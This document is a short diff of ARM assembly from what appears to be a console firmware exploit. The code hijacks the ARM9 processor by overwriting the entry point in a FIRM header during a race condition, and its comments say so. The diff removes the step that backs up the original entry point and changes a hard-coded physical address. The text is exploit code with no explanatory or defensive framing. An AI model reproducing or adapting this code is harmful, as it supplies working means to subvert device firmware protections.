@@ -78,12 +78,6 @@ wait_arm9_loop:
 	ANDS            R0, R0, #1
 	BNE	            wait_arm9_loop
 	
-	@ get arm9 orig entry point phys addr from FIRM header
-	LDR             R0, [R10, #0x0C]
-
-	@ backup orig entry point to FCRAM + offs ARM9 payload + 4
-	STR             R0, [R9, #0x4]
-
 	@ overwrite orig entry point with FCRAM addr
 	@ this exploits the race condition bug
 	STR             R9, [R10, #0x0C] 	
@@ -96,7 +90,7 @@ wait_arm11_loop:
 	BX              R1
 
 	pa_hijack_arm9_dst:  .long 0x1FFFFC00
-	pa_arm11_code:       .long 0x1FFFFFFC
+	pa_arm11_code:       .long 0x1FFFFFF8
 	pa_pxi_regs:         .long 0x10163000
 	some_pxi_cmd:        .long 0x44846
 	pa_firm_header:      .long 0x24000000
